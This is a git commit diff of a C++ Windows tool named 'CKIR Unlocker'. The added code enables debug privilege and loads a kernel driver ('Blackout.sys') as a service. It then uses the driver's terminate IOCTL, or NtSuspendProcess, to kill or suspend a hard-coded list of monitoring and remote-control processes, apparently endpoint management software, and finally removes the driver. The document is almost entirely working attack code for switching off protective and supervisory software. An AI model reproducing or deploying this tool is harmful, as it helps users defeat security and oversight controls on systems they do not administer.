b2efac33074b025106679057c1d2a1a65e581eab
배동인 <67633420+skyneton@users.noreply.github.com>
2025-05-01 21:59:53 +0900

    update

--- CKIR Unlocker/main.cpp
+++ CKIR Unlocker/main.cpp
@@ -1,34 +1,180 @@
 #include <Windows.h>
 #include <TlHelp32.h>
 #include <iostream>
+#include <io.h>
+#include <ntstatus.h>
 using namespace std;
 #define INITIALIZE_IOCTL_CODE 0x9876C004
 #define TERMINSTE_PROCESS_IOCTL_CODE 0x9876C094
 
-bool TerminateProc(PROCESSENTRY32& procEntry) {
+typedef long (NTAPI* pNtSuspendProcess)(HANDLE proccessHandle);
+pNtSuspendProcess NtSuspendProcess;
+
+void Elevate() {
+    HANDLE token;
+    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);
+    TOKEN_PRIVILEGES tp;
+    LUID luid;
+    LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid);
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid = luid;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    //privs.Luid.LowPart = privs.Luid.HighPart = 0;
+    if (AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), NULL, NULL))
+        cout << "Success Privileges.\n";
+}
+
+bool LoadNT() {
+    auto ntdll = GetModuleHandleA("ntdll.dll");
+    if (!ntdll) return false;
+    NtSuspendProcess = (pNtSuspendProcess)GetProcAddress(ntdll, "NtSuspendProcess");
+    return !!NtSuspendProcess;
+}
+
+bool LoadDriver(const char* serviceName, char* driverPath) {
+    SC_HANDLE hSCM, hService;
+
+    // Open a handle to the SCM database
+    hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    if (hSCM == NULL) {
+        return 0;
+    }
+
+    // Check if the service already exists
+    hService = OpenServiceA(hSCM, serviceName, SERVICE_ALL_ACCESS);
+    if (hService != NULL)
+    {
+        cout << "Service already exists.\n";
+
+        // Start the service if it's not running
+        SERVICE_STATUS serviceStatus;
+        if (!QueryServiceStatus(hService, &serviceStatus))
+        {
+            CloseServiceHandle(hService);
+            CloseServiceHandle(hSCM);
+            return 0;
+        }
+
+        if (serviceStatus.dwCurrentState == SERVICE_STOPPED)
+        {
+            if (!StartServiceA(hService, 0, nullptr))
+            {
+                cout << "Could not found.\n";
+                CloseServiceHandle(hService);
+                CloseServiceHandle(hSCM);
+                return 0;
+            }
+
+            cout << "Starting service...\n";
+        }
+
+        CloseServiceHandle(hService);
+        CloseServiceHandle(hSCM);
+        return 1;
+    }
+
+    // Create the service
+    hService = CreateServiceA(
+        hSCM,
+        serviceName,
+        serviceName,
+        SERVICE_ALL_ACCESS,
+        SERVICE_KERNEL_DRIVER,
+        SERVICE_DEMAND_START,
+        SERVICE_ERROR_IGNORE,
+        driverPath,
+        NULL,
+        NULL,
+        NULL,
+        NULL,
+        NULL
+    );
+
+    if (hService == NULL) {
+        CloseServiceHandle(hSCM);
+        return (1);
+    }
+
+    cout << "Service created successfully.\n";
+
+    // Start the service
+    if (!StartServiceA(hService, 0, nullptr))
+    {
+        CloseServiceHandle(hService);
+        CloseServiceHandle(hSCM);
+        return 0;
+    }
+
+    cout << "Starting service...\n";
+
+    CloseServiceHandle(hService);
+    CloseServiceHandle(hSCM);
+
+    return 1;
+}
+
+bool RemoveDriver(const char* serviceName, char* driverPath) {
+    SC_HANDLE hSCM, hService;
+
+    // Open a handle to the SCM database
+    hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    if (hSCM == NULL) {
+        return 0;
+    }
+
+    // Check if the service already exists
+    hService = OpenServiceA(hSCM, serviceName, SERVICE_ALL_ACCESS);
+    if (hService == NULL)
+    {
+        cout << "Service already deleted.\n";
+        return 0;
+    }
+    DeleteService(hService);
+
+    cout << "Service deleted.\n";
+
+    CloseServiceHandle(hService);
+    CloseServiceHandle(hSCM);
+
+    return 1;
+}
+
+bool TerminateProc(HANDLE terminateHandle, PROCESSENTRY32& procEntry) {
+    DWORD output[2] = { 0 };
+    DWORD size = sizeof(output);
+    DWORD byteReturned = 0;
+    if (DeviceIoControl(terminateHandle, TERMINSTE_PROCESS_IOCTL_CODE, &procEntry.th32ProcessID, sizeof(procEntry.th32ProcessID), output, size, &byteReturned, NULL)) {
+        return true;
+    }
+
 	DWORD dwExitCode = 0;
 	auto handle = OpenProcess(PROCESS_ALL_ACCESS, 0, procEntry.th32ProcessID);
-	if (GetExitCodeProcess(handle, &dwExitCode)) {
+	/*if (GetExitCodeProcess(handle, &dwExitCode)) {
 		if (TerminateProcess(handle, dwExitCode)) {
 			CloseHandle(handle);
 			return true;
 		}
-	}
+	}*/
+
+    if (NtSuspendProcess) {
+        auto result = NtSuspendProcess(handle);
+        cout << result;
+        if (result >= 0) {
+            CloseHandle(handle);
+            return true;
+        }
+    }
+
 	CloseHandle(handle);
 
-	DWORD output[2] = { 0 };
-	DWORD size = sizeof(output);
-	DWORD byteReturned = 0;
-	handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	if (DeviceIoControl(handle, TERMINSTE_PROCESS_IOCTL_CODE, &procEntry.th32ProcessID, sizeof(procEntry.th32ProcessID), output, size, &byteReturned, NULL)) {
-		CloseHandle(handle);
-		return true;
-	}
-	CloseHandle(handle);
 	return false;
 }
 
 void Unlock() {
+    auto terminateHandle = CreateFile(L"\\\\.\\Blackout", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    /*if (terminateHandle == INVALID_HANDLE_VALUE) {
+        cout << "INVALID HANDLE\n";
+    }*/
 	auto handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 
 	PROCESSENTRY32 procEntry = { 0 };
@@ -37,38 +183,67 @@ void Unlock() {
 	do {
 		if (!wcscmp(procEntry.szExeFile, L"lqndauccd.exe") || !wcscmp(procEntry.szExeFile, L"MaestroWebSvr.exe")
 			|| !wcscmp(procEntry.szExeFile, L"qukapttp.exe") || !wcscmp(procEntry.szExeFile, L"MaestroWebAgent.exe")
-			|| !wcscmp(procEntry.szExeFile, L"nfowjxyfd.exe") || !wcscmp(procEntry.szExeFile, L"notepad.exe")) {
+            || !wcscmp(procEntry.szExeFile, L"nfowjxyfd.exe") || !wcscmp(procEntry.szExeFile, L"notepad.exe")) {
 			cout << "Latest CKIR process ["; wcout << procEntry.szExeFile; cout << "] ";
-			if (TerminateProc(procEntry)) cout << "KILLED\n";
+			if (TerminateProc(terminateHandle, procEntry)) cout << "KILLED\n";
 			else cout << "KILL failed\n";
 			continue;
 		}
 		if (!wcscmp(procEntry.szExeFile, L"TDepend64.exe") || !wcscmp(procEntry.szExeFile, L"TDepend.exe")) {
 			cout << "Remote control process ["; wcout << procEntry.szExeFile; cout << "] ";
-			if (TerminateProc(procEntry)) cout << "KILLED\n";
+			if (TerminateProc(terminateHandle, procEntry)) cout << "KILLED\n";
 			else cout << "KILL failed\n";
 			continue;
 		}
 		if (!wcscmp(procEntry.szExeFile, L"rwtyijsa.exe") || !wcscmp(procEntry.szExeFile, L"nhfneczzm.exe")) {
 			cout << "Unknown process ["; wcout << procEntry.szExeFile; cout << "] ";
-			if (TerminateProc(procEntry)) cout << "KILLED\n";
+			if (TerminateProc(terminateHandle, procEntry)) cout << "KILLED\n";
 			else cout << "KILL failed\n";
 			continue;
 		}
 		if (!wcscmp(procEntry.szExeFile, L"SoluSpSvr.exe") || !wcscmp(procEntry.szExeFile, L"MaestroNAgent.exe")
 			|| !wcscmp(procEntry.szExeFile, L"MaestroNSvr.exe")) {
 			cout << "Legacy CKIR process ["; wcout << procEntry.szExeFile; cout << "] ";
-			if (TerminateProc(procEntry)) cout << "KILLED\n";
+			if (TerminateProc(terminateHandle, procEntry)) cout << "KILLED\n";
 			else cout << "KILL failed\n";
 			continue;
 		}
 	} while (Process32Next(handle, &procEntry));
 	CloseHandle(handle);
+    CloseHandle(terminateHandle);
 }
+
 int main() {
 	cin.tie(0), cout.tie(0)->sync_with_stdio(0);
+    Elevate();
+
+    WIN32_FIND_DATAA file;
+    char driverPath[MAX_PATH];
+    if (FindFirstFileA("Blackout.sys", &file) != INVALID_HANDLE_VALUE) {
+        if (GetFullPathNameA(file.cFileName, MAX_PATH, driverPath, NULL) != 0) {
+            cout << "Driver found.\n";
+        }
+        else
+            cout << "Find Driver Failed\n";
+    }
+    else
+        cout << "Find Driver Failed\n";
+
+    if (!LoadDriver("Blackout", driverPath))
+        cout << "Faild to load driver ,try to run the program as administrator!!\n";
+
+    if (LoadNT())
+        cout << "NT Loaded\n";
+    else
+        cout << "NT Load Failed..\n";
+
 	Unlock();
+    end:
+    if (!RemoveDriver("Blackout", driverPath)) {
+        cout << "Service delete failed.\n";
+    }
 	cout << "\n\nPress Enter to exit...";
+    system("pause");
 	getchar();
 	return 0;
 }
